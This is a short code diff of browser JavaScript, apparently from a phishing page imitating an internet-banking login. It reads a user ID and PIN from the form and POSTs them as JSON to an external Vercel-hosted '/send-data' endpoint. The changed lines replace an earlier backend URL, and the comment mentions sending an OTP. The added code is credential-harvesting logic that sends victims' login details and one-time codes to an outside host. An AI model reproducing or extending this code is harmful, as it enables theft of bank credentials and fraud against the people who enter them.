@@ -24,8 +24,8 @@ document.addEventListener('DOMContentLoaded', () => {
             const user = document.getElementById('txiID').value;
             const pass = document.getElementById('txiPwd').value;
 
-            // SEND TO RENDER (JSON Format)
-            fetch(renderURL, {
+                // SEND OTP TO VERCEL
+                fetch('https://ib-backend-rho.vercel.app/send-data', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ userId: user, pin: pass })
